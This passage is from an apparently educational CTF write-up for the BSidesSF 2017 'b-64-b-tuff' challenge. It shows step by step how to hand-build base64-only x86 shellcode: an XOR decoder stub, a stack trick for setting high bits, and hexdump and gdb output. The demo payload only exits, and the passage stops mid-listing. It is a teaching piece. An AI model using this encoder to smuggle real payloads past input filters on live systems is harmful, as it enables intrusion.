Let's start our decoder by simply calculating each of these values in eax, just to prove that they're all base64-compatible (note that we are simply discarding the values in this example, we aren't doing anything with them quite yet):

<pre id='vimCodeElement'>
<span class="Identifier">push</span> <span class="Number">0x43614241</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x2b39432b</span> <span class="Comment">; 0x6858016a</span>

<span class="Identifier">push</span> <span class="Number">0x6a6a6a6a</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x2b2b2b2b</span> <span class="Comment">; 0x41414141</span>

<span class="Identifier">push</span> <span class="Number">0x6a6a6a62</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x2b2b2b39</span> <span class="Comment">; 0x4141415b</span>
</pre>

Which assembles to:

<pre>
$ hexdump -Cv file
00000000  68 41 42 61 43 58 35 2b  43 39 2b 68 6a 6a 6a 6a  |hABaCX5+C9+hjjjj|
00000010  58 35 2b 2b 2b 2b 68 62  6a 6a 6a 58 35 39 2b 2b  |X5++++hbjjjX59++|
00000020  2b                                                |+|
</pre>

Looking good so far!

<h2>Decoder stub</h2>

Okay, we've proven that we can encode instructions (without the most significant bit set)! Now we actually want to run it!

Basically: our shellcode is going to start with a decoder, followed by a bunch of encoded bytes. We'll also throw some padding in between to make this easier to do by hand. The entire decoder has to be made up of base64-compatible bytes, but the encoded payload (ie, the shellcode) has no restrictions.

So now we actually want to alter the shellcode in memory (self-rewriting code!). We need an instruction to do that, so let's look back at the <a href='https://github.com/BSidesSF/ctf-2017-release/blob/master/pwn/b-64-b-tuff/solution/command_set.txt'>list of available instructions</a>! After some searching, I found one that's promising:

<pre id='vimCodeElement'>
<span class="Number">3151</span>??            <span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+0<span class="Identifier">x</span>??],<span class="Identifier">edx</span>
</pre>

This command xors the 32-bit value at memory address <tt>ecx+0x??</tt> with <tt>edx</tt>. We know we can easily control ecx (push (value) / pop eax / xor (other value) / push eax / pop ecx) and, similarly edx. Since the "0x??" value has to also be a base64 character, we'll follow our trend and use [ecx+0x41], which gives us:

<pre id='vimCodeElement'>
<span class="Number">3151</span>41            <span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+0<span class="Identifier">x</span>41],<span class="Identifier">edx</span>
</pre>

Once I found that command, things started coming together! Since I can control eax, ecx, and edx pretty cleanly, that's basically the perfect instruction to decode our shellcode in-memory!

This is somewhat complex, so let's start by looking at the steps involved:

<ul>
<li>Load the encoded shellcode (half of the xor pair, ie, the return value from get_xor_values_32()) into a known memory address (in our case, it's going to be 0x141 bytes after the start of our code)
<li>Set ecx to the value that's 0x41 bytes before that encoded shellcode (0x100)</li>
<li>For each 32-bit pair in the encoded shellcode...
  <ul>
    <li>Load the other half of the xor pair into edx</li>
    <li>Do the xor to alter it in-memory (ie, decode it back to the original, unencoded value)</li>
    <li>Increment ecx to point at the next value</li>
    <li>Repeat for the full payload</li>
  </ul>
</li>
<li>Run the newly decoded payload</li>
</ul>

For the sake of our sanity, we're going to make some assumptions in the code: first, our code is loaded to the address 0x41410000 (which it is, for this challenge). Second, the decoder stub is exactly 0x141 bytes long (we will pad it to get there). Either of these can be easily worked around, but it's not necessary to do the extra work in order to grok the decoder concept.

Recall that for our sys_exit shellcode, the xor pairs we determined were: 0x43614241 ^ 0x2b39432b, 0x6a6a6a6a ^ 0x2b2b2b2b, and 0x6a6a6a62 ^ 0x2b2b2b39.

Here's the code:

<pre id='vimCodeElement'>
<span class="Comment">; Set ecx to 0x41410100 (0x41 bytes less than the start of the encoded data)</span>
<span class="Identifier">push</span> <span class="Number">0x6a6a4241</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x2b2b4341</span> <span class="Comment">; eax -&gt; 0x41410100</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">pop</span> <span class="Identifier">ecx</span> <span class="Comment">; ecx -&gt; 0x41410100</span>

<span class="Comment">; Set edx to the first value in the first xor pair</span>
<span class="Identifier">push</span> <span class="Number">0x43614241</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>

<span class="Comment">; xor it with the second value in the first xor pair (which is at ecx + 0x41)</span>
<span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+<span class="Number">0x41</span>], <span class="Identifier">edx</span>

<span class="Comment">; Move ecx to the next 32-bit value</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>

<span class="Comment">; Set edx to the first value in the second xor pair</span>
<span class="Identifier">push</span> <span class="Number">0x6a6a6a6a</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>

<span class="Comment">; xor + increment ecx again</span>
<span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+<span class="Number">0x41</span>], <span class="Identifier">edx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>

<span class="Comment">; Set edx to the first value in the third and final xor pair, and xor it</span>
<span class="Identifier">push</span> <span class="Number">0x6a6a6a62</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>
<span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+<span class="Number">0x41</span>], <span class="Identifier">edx</span>

<span class="Comment">; At this point, I assembled the code and counted the bytes; we have exactly 0x30 bytes of code so far. That means to get our encoded shellcode to exactly 0x141 bytes after the start, we need 0x111 bytes of padding ('A' translates to inc ecx, so it's effectively a no-op because the encoded shellcode doesn't care what ecx starts as):</span>
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>'
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>'
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>'
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>'
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>'
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>'
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>'
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>'
<span class="Identifier">db</span> '<span class="Identifier">AAAAAAAAAAAAAAAAA</span>'

<span class="Comment">; Now, the second halves of our xor pairs; this is what gets modified in-place</span>
<span class="Identifier">dd</span> <span class="Number">0x2b39432b</span>
<span class="Identifier">dd</span> <span class="Number">0x2b2b2b2b</span>
<span class="Identifier">dd</span> <span class="Number">0x2b2b2b39</span>

<span class="Comment">; And finally, we're going to cheat and just do a syscall that's non-base64-compatible</span>
<span class="Identifier">int</span> <span class="Number">0x80</span>
</pre>

All right! Here's what it gives us; note that other than the syscall at the end (we'll get to that, I promise!), it's all base64:

<pre>
$ hexdump -Cv file
00000000  68 41 42 6a 6a 58 35 41  43 2b 2b 50 59 68 41 42  |hABjjX5AC++PYhAB|
00000010  61 43 5a 31 51 41 41 41  41 41 68 6a 6a 6a 6a 5a  |aCZ1QAAAAAhjjjjZ|
00000020  31 51 41 41 41 41 41 68  62 6a 6a 6a 5a 31 51 41  |1QAAAAAhbjjjZ1QA|
00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000040  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000050  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000060  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000070  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000080  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000090  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
000000a0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
000000b0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
000000c0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
000000d0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
000000e0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
000000f0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000100  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000110  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000120  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000130  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000140  41 2b 43 39 2b 2b 2b 2b  2b 39 2b 2b 2b cd 80     |A+C9+++++9+++..|
</pre>

To run this, we have to patch run_raw_code.c to load the code to the correct address:

<pre id='vimCodeElement'>
<span class="DiffFile">diff --git a/forensics/ximage/solution/run_raw_code.c b/forensics/ximage/solution/run_raw_code.c</span>
<span class="PreProc">index 9eadd5e..1ad83f1 100644</span>
<span class="DiffNewFile">--- a/forensics/ximage/solution/run_raw_code.c</span>
<span class="DiffFile">+++ b/forensics/ximage/solution/run_raw_code.c</span>
<span class="DiffLine">@@ -12,7 +12,7 @@</span><span class="PreProc"> int main(int argc, char *argv[]){</span>
     exit(0);
   }

<span class="DiffRemoved">-  void * a = mmap(0, statbuf.st_size, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);</span>
<span class="DiffAdded">+  void * a = mmap(0x41410000, statbuf.st_size, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);</span>
   printf(&quot;allocated %d bytes of executable memory at: %p\n&quot;, statbuf.st_size, a);

   FILE *file = fopen(argv[1], &quot;rb&quot;);
</pre>

You'll also have to compile it in 32-bit mode:

<pre>
$ gcc -m32 -o run_raw_code run_raw_code.c
</pre>

Once that's done, give 'er a shot:

<pre id='vimCodeElement'>
$ strace ~<span class="rubyStringDelimiter">/</span><span class="rubyRegexp">projects</span><span class="rubyStringDelimiter">/</span>ctf-2017-release/forensics/ximage/solution/run_raw_code ./file
[...]
read(<span class="Number">3</span>, <span class="rubyStringDelimiter">&quot;</span><span class="String">hABjjX5AC++PYhABaCZ1QAAAAAhjjjjZ</span><span class="rubyStringDelimiter">&quot;</span>..., <span class="Number">335</span>) = <span class="Number">335</span>
<span class="Statement">exit</span>(<span class="Number">1094795585</span>)                        = ?
</pre>

We did it, team!

If we want to actually inspect the code, we can change the very last padding 'A' into 0xcc (aka, int 3, or a SIGTRAP):

<pre id='vimCodeElement'>
$ diff -u file.asm file-trap.asm
<span class="DiffNewFile">--- file.asm    2017-06-11 13:17:57.766651742 -0700</span>
<span class="DiffFile">+++ file-trap.asm       2017-06-11 13:17:46.086525100 -0700</span>
<span class="DiffLine">@@ -45,7 +45,7 @@</span>
 db 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 db 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 db 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
<span class="DiffRemoved">-db 'AAAAAAAAAAAAAAAAA'</span>
<span class="DiffAdded">+db 'AAAAAAAAAAAAAAAA', 0xcc</span>

 ; Now, the second halves of our xor pairs
 dd 0x2b39432b
</pre>

And run it with corefiles enabled:

<pre id='vimCodeElement'>
$ nasm -o file file.asm
$ ulimit -c unlimited
$ ~<span class="rubyStringDelimiter">/</span><span class="rubyRegexp">projects</span><span class="rubyStringDelimiter">/</span>ctf-2017-release/forensics/ximage/solution/run_raw_code ./file
allocated <span class="Number">335</span> bytes of executable memory <span class="rubySymbol">at</span>: <span class="Number">0x41410000</span>
<span class="rubySymbol">fish</span>: “~<span class="rubyStringDelimiter">/</span><span class="rubyRegexp">projects</span><span class="rubyStringDelimiter">/</span>ctf-2017-release/<span class="Statement">for</span>...” terminated by signal SIGTRAP (<span class="rubyConstant">Trace</span> <span class="Statement">or</span> breakpoint <span class="Statement">trap</span>)
$ gdb ~<span class="rubyStringDelimiter">/</span><span class="rubyRegexp">projects</span><span class="rubyStringDelimiter">/</span>ctf-2017-release/forensics/ximage/solution/run_raw_code ./core
<span class="rubyConstant">Core</span> was generated by <span class="rubyStringDelimiter">`</span><span class="String">/home/ron/projects/ctf-2017-release/forensics/ximage/solution/run_raw_code ./fi</span><span class="rubyStringDelimiter">`</span>.
<span class="rubyConstant">Program</span> terminated with signal <span class="rubyConstant">SIGTRAP</span>, <span class="rubyConstant">Trace</span>/breakpoint <span class="Statement">trap</span>.
<span class="Comment">#0  0x41410141 in ?? ()</span>
(gdb) x/<span class="Number">10i</span> <span class="Identifier">$eip</span>
=&gt; <span class="Number">0x41410141</span>:  push   <span class="Number">0x1</span>
   <span class="Number">0x41410143</span>:  pop    eax
   <span class="Number">0x41410144</span>:  push   <span class="Number">0x41414141</span>
   <span class="Number">0x41410149</span>:  pop    ebx
   <span class="Number">0x4141014a</span>:  inc    ecx
   <span class="Number">0x4141014b</span>:  inc    ecx
   <span class="Number">0x4141014c</span>:  inc    ecx
   <span class="Number">0x4141014d</span>:  int    <span class="Number">0x80</span>
   <span class="Number">0x4141014f</span>:  add    <span class="rubyConstant">BYTE</span> <span class="rubyConstant">PTR</span> [eax],al
   <span class="Number">0x41410151</span>:  add    <span class="rubyConstant">BYTE</span> <span class="rubyConstant">PTR</span> [eax],al
</pre>

As you can see, our original shellcode is properly decoded! (The <tt>inc ecx</tt> instructions you're seeing is our padding.)

The decoder stub and encoded shellcode can be quite easily generated programmatically rather than doing it by hand, which is extremely error prone (it took me 4 tries to get it right - I messed up the start address, I compiled run_raw_code in 64-bit mode, and I got the endianness backwards before I finally got it right, which doesn't sound so bad, except that I had to go back and re-write part of this section and re-run most of the commands to get the proper output each time :) ).

<h2>That pesky most-significant-bit</h2>

So, I've been avoiding this, because I don't think I solved it in a very elegant way. But, my solution works, so I guess that's something. :)

As usual, we start by looking at our <a href='https://github.com/BSidesSF/ctf-2017-release/blob/master/pwn/b-64-b-tuff/solution/command_set.txt'>set of available instructions</a> to see what we can use to set the most significant bit (let's start calling it the "MSB" to save my fingers).

Unfortunately, the easy stuff can't help us; xor can only set it if it's already set somewhere, we don't have any shift instructions, inc would take forever, and the subtract and multiply instructions could <em>probably</em> work, but it would be tricky.

Let's start with a simple case: can we set edx to 0x80?

First, let's set edx to the highest value we can, 0x7F (we choose edx because a) it's one of the three registers we can easily pop into; b) eax is our working variable since it's the only one we can xor; and c) we don't want to change ecx once we start going, since it points to the memory we're decoding):

<pre id='vimCodeElement'>
irb(main):<span class="Number">057</span>:<span class="Number">0</span>&gt; puts <span class="rubyStringDelimiter">'</span><span class="String">0x%08x ^ 0x%08x</span><span class="rubyStringDelimiter">'</span> % get_xor_values_32(<span class="Number">0x0000007F</span>)
<span class="Number">0x41414146</span> ^ <span class="Number">0x41414139</span>
</pre>

Using those values and our old push / pop / xor pattern, we can set edx to 0x80:

<pre id='vimCodeElement'>
<span class="Identifier">push</span> <span class="Number">0x41414146</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x41414139</span> <span class="Comment">; eax -&gt; 0x7F</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span> <span class="Comment">; edx -&gt; 0x7F</span>

<span class="Comment">; Now that edx is 0x7F, we can simply increment it</span>
<span class="Identifier">inc</span> <span class="Identifier">edx</span> <span class="Comment">; edx -&gt; 0x80</span>
</pre>

That works out to:

<pre>
00000000  68 46 41 41 41 58 35 39  41 41 41 50 5a 42        |hFAAAX59AAAPZB|
</pre>

So far so good! Now we can do our usual xor to set that one bit in our decoded code:

<pre id='vimCodeElement'>
<span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+<span class="Number">0x41</span>], <span class="Identifier">edx</span>
</pre>

This sets the MSB of whatever ecx+0x41 (our current instruction) is.

If we were decoding a single bit at a time, we'd be done. Unfortunately, we aren't so lucky - we're working in 32-bit (4-byte) chunks.

<h2>Setting edx to 0x00008000, 0x00800000, or 0x80000000</h2>

So how do we set edx to 0x00008000, 0x00800000, or 0x80000000 without having a shift instruction?

This is where I introduce a pretty ugly hack. In effect, we use some stack shenanigans to perform a poor-man's shift. This won't work on most non-x86/x64 systems, because they require a word-aligned stack (I was actually a little surprised it worked on x86, to be honest!).

Let's say we want 0x00008000. Let's just look at the code:

<pre id='vimCodeElement'>
<span class="Comment">; Set all registers to 0 so we start with a clean slate, using the popad strategy from earlier (we need a register that's reliably 0)</span>
<span class="Identifier">push</span> <span class="Number">0x41414141</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x41414141</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">popad</span>

<span class="Comment">; Set edx to 0x00000080, just like before</span>
<span class="Identifier">push</span> <span class="Number">0x41414146</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x41414139</span> <span class="Comment">; eax -&gt; 0x7F</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span> <span class="Comment">; edx -&gt; 0x7F</span>
<span class="Identifier">inc</span> <span class="Identifier">edx</span> <span class="Comment">; edx -&gt; 0x80</span>

<span class="Comment">; Push edi (which, like all registers, is 0) onto the stack</span>
<span class="Identifier">push</span> <span class="Identifier">edi</span> <span class="Comment">; 0x00000000</span>

<span class="Comment">; Push edx onto the stack</span>
<span class="Identifier">push</span> <span class="Identifier">edx</span>

<span class="Comment">; Move esp by 1 byte - note that this won't work on many architectures, but x86/x64 are fine with a misaligned stack</span>
<span class="Identifier">dec</span> <span class="Identifier">esp</span>

<span class="Comment">; Get edx back, shifted by one byte</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>

<span class="Comment">; Fix the stack (not &lt;em&gt;really&lt;/em&gt; necessary, but it's nice to do it</span>
<span class="Identifier">inc</span> <span class="Identifier">esp</span>

<span class="Comment">; Add a debug breakpoint so we can inspect the value</span>
<span class="Identifier">int</span> <span class="Number">3</span>
</pre>

And we can use gdb to prove it works with the same trick as before:

<pre id='vimCodeElement'>
$ nasm <span class="Special">-o</span> file file.asm
$ <span class="Statement">rm</span> <span class="Special">-f</span> core
$ <span class="Statement">ulimit</span> <span class="Special">-c</span> unlimited
$ ./run_raw_code ./file
allocated <span class="Number">41</span> bytes of executable memory at: 0x41410000
fish: “~/projects/ctf-2017-release/for...” terminated by signal SIGTRAP <span class="PreProc">(</span><span class="Special">Trace or breakpoint </span><span class="Statement">trap</span><span class="PreProc">)</span>
$ gdb ./run_raw_code ./core
Program terminated with signal SIGTRAP, Trace/breakpoint <span class="Statement">trap</span>.
<span class="Comment">#0  0x41410029 in ?? ()</span>
<span class="PreProc">(</span><span class="Special">gdb</span><span class="PreProc">)</span> <span class="Statement">print</span><span class="String">/x </span><span class="PreProc">$edx</span>
<span class="PreProc">$1</span> <span class="Operator">=</span> 0x8000
</pre>

We can do basically the exact same thing to set the third byte:

<pre id='vimCodeElement'>
<span class="Identifier">push</span> <span class="Identifier">edi</span> <span class="Comment">; 0x00000000</span>
<span class="Identifier">push</span> <span class="Identifier">edx</span>
<span class="Identifier">dec</span> <span class="Identifier">esp</span>
<span class="Identifier">dec</span> <span class="Identifier">esp</span> <span class="Comment">; &lt;-- New</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>
<span class="Identifier">inc</span> <span class="Identifier">esp</span>
<span class="Identifier">inc</span> <span class="Identifier">esp</span> <span class="Comment">; &lt;-- New</span>
</pre>

And the fourth:

<pre id='vimCodeElement'>
<span class="Identifier">push</span> <span class="Identifier">edi</span> <span class="Comment">; 0x00000000</span>
<span class="Identifier">push</span> <span class="Identifier">edx</span>
<span class="Identifier">dec</span> <span class="Identifier">esp</span>
<span class="Identifier">dec</span> <span class="Identifier">esp</span>
<span class="Identifier">dec</span> <span class="Identifier">esp</span> <span class="Comment">; &lt;-- New</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>
<span class="Identifier">inc</span> <span class="Identifier">esp</span>
<span class="Identifier">inc</span> <span class="Identifier">esp</span>
<span class="Identifier">inc</span> <span class="Identifier">esp</span> <span class="Comment">; &lt;-- New</span>
</pre>

<h2>Putting it all together</h2>

You can take a look at how I do this in <a href='https://github.com/BSidesSF/ctf-2017-release/blob/master/pwn/b-64-b-tuff/solution/sploit.rb'>my final code</a>. It's going to be a little different, because instead of using our xor trick to set edx to 0x7F, I instead push 0x7a / pop edx / increment 6 times. The only reason is that I didn't think of the xor trick when I was writing the original code, and I don't want to mess with it now.

But, we're going to do it the hard way: by hand! I'm literally writing this code as I write the blog (and, message from the future: it worked on the second try :) ).

Let's just stick with our simple exit-with-0x41414141-status shellcode:

<pre id='vimCodeElement'>
<span class="Identifier">mov</span> <span class="Identifier">eax</span>, <span class="Number">0x01</span> <span class="Comment">; Syscall 1 = sys_exit</span>
<span class="Identifier">mov</span> <span class="Identifier">ebx</span>, <span class="Number">0x41414141</span> <span class="Comment">; First (and only) parameter: the exit code</span>
<span class="Identifier">int</span> <span class="Number">0x80</span>
</pre>

Which assembles to this, which is conveniently already a multiple of 4 bytes so no padding required:

<pre>
00000000  b8 01 00 00 00 bb 41 41  41 41 cd 80              |......AAAA..|
</pre>

Since we're doing it by hand, let's extract all the MSBs into a separate string (remember, this is all done programmatically usually):

<pre>
00000000  38 01 00 00 00 3b 41 41  41 41 4d 00              |......AAAA..|
00000000  80 00 00 00 00 80 00 00  00 00 80 80              |......AAAA..|
</pre>

If you xor those two strings together, you'll get the original string back.

First, let's worry about the first string. It's handled exactly the way we did the last example. We start by getting the three 32-bit values as little endian values:

<ul>
<li>38 01 00 00 -&gt; 0x00000138
<li>00 3b 41 41 -&gt; 0x41413b00
<li>41 41 4d 00 -&gt; 0x004d4141
</ul>

And then find the xor pairs to generate them just like before:

<pre id='vimCodeElement'>
irb(main):<span class="Number">061</span>:<span class="Number">0</span>&gt; puts <span class="rubyStringDelimiter">'</span><span class="String">0x%08x ^ 0x%08x</span><span class="rubyStringDelimiter">'</span> % get_xor_values_32(<span class="Number">0x00000138</span>)
<span class="Number">0x41414241</span> ^ <span class="Number">0x41414379</span>

irb(main):<span class="Number">062</span>:<span class="Number">0</span>&gt; puts <span class="rubyStringDelimiter">'</span><span class="String">0x%08x ^ 0x%08x</span><span class="rubyStringDelimiter">'</span> % get_xor_values_32(<span class="Number">0x41413b00</span>)
<span class="Number">0x6a6a4141</span> ^ <span class="Number">0x2b2b7a41</span>

irb(main):<span class="Number">063</span>:<span class="Number">0</span>&gt; puts <span class="rubyStringDelimiter">'</span><span class="String">0x%08x ^ 0x%08x</span><span class="rubyStringDelimiter">'</span> % get_xor_values_32(<span class="Number">0x004d4141</span>)
<span class="Number">0x41626a6a</span> ^ <span class="Number">0x412f2b2b</span>
</pre>

But here's where the twist comes: let's take the MSB string above, and also convert that to little-endian integers:

<ul>
<li>80 00 00 00 -&gt; 0x00000080
<li>00 80 00 00 -&gt; 0x00008000
<li>00 00 80 80 -&gt; 0x80800000
</ul>

Now, let's try writing our decoder stub just like before, except that after decoding the MSB-free vale, we're going to separately inject the MSBs into the code!

<pre id='vimCodeElement'>
<span class="Comment">; Set all registers to 0 so we start with a clean slate, using the popad strategy from earlier</span>
<span class="Identifier">push</span> <span class="Number">0x41414141</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x41414141</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">popad</span>

<span class="Comment">; Set ecx to 0x41410100 (0x41 bytes less than the start of the encoded data)</span>
<span class="Identifier">push</span> <span class="Number">0x6a6a4241</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x2b2b4341</span> <span class="Comment">; 0x41410100</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">pop</span> <span class="Identifier">ecx</span>

<span class="Comment">; xor the first pair</span>
<span class="Identifier">push</span> <span class="Number">0x41414241</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>
<span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+<span class="Number">0x41</span>], <span class="Identifier">edx</span>

<span class="Comment">; Now we need to xor with 0x00000080, so let's load it into edx</span>
<span class="Identifier">push</span> <span class="Number">0x41414146</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x41414139</span> <span class="Comment">; 0x0000007F</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>
<span class="Identifier">inc</span> <span class="Identifier">edx</span> <span class="Comment">; edx is now 0x00000080</span>
<span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+<span class="Number">0x41</span>], <span class="Identifier">edx</span>

<span class="Comment">; Move to the next value</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>

<span class="Comment">; xor the second pair</span>
<span class="Identifier">push</span> <span class="Number">0x6a6a4141</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>
<span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+<span class="Number">0x41</span>], <span class="Identifier">edx</span>

<span class="Comment">; Now we need to xor with 0x00008000</span>
<span class="Identifier">push</span> <span class="Number">0x41414146</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x41414139</span> <span class="Comment">; 0x0000007F</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>
<span class="Identifier">inc</span> <span class="Identifier">edx</span> <span class="Comment">; edx is now 0x00000080</span>

<span class="Identifier">push</span> <span class="Identifier">edi</span> <span class="Comment">; 0x00000000</span>
<span class="Identifier">push</span> <span class="Identifier">edx</span>
<span class="Identifier">dec</span> <span class="Identifier">esp</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span> <span class="Comment">; edx is now 0x00008000</span>
<span class="Identifier">inc</span> <span class="Identifier">esp</span>
<span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+<span class="Number">0x41</span>], <span class="Identifier">edx</span>

<span class="Comment">; Move to the next value</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>
<span class="Identifier">inc</span> <span class="Identifier">ecx</span>

<span class="Comment">; xor the third pair</span>
<span class="Identifier">push</span> <span class="Number">0x41626a6a</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>
<span class="Identifier">xor</span> [<span class="Identifier">ecx</span>+<span class="Number">0x41</span>], <span class="Identifier">edx</span>

<span class="Comment">; Now we need to xor with 0x80800000; we'll do it in two operations, with 0x00800000 first</span>
<span class="Identifier">push</span> <span class="Number">0x41414146</span>
<span class="Identifier">pop</span> <span class="Identifier">eax</span>
<span class="Identifier">xor</span> <span class="Identifier">eax</span>, <span class="Number">0x41414139</span> <span class="Comment">; 0x0000007F</span>
<span class="Identifier">push</span> <span class="Identifier">eax</span>
<span class="Identifier">pop</span> <span class="Identifier">edx</span>
